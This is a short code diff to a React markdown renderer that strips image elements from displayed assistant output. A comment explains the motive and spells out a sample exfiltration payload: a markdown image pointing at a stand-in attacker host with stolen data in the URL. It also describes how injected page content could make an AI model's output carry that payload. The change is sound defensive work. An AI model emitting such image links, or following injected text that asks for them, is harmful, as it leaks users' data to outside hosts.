@@ -56,6 +56,15 @@ const components: Components = {
   h3: Heading,
 }
 
+// Assistant output is remote-controlled and can echo recorded page content, so
+// an injected `![](https://attacker/?<data>)` would exfiltrate via the image
+// fetch (the app CSP has no img-src). Drop images entirely; the log is text.
+const disallowedElements = ['img']
+
 export function SimpleMarkdown({ text }: { text: string }) {
-  return <Markdown components={components}>{text}</Markdown>
+  return (
+    <Markdown components={components} disallowedElements={disallowedElements}>
+      {text}
+    </Markdown>
+  )
 }
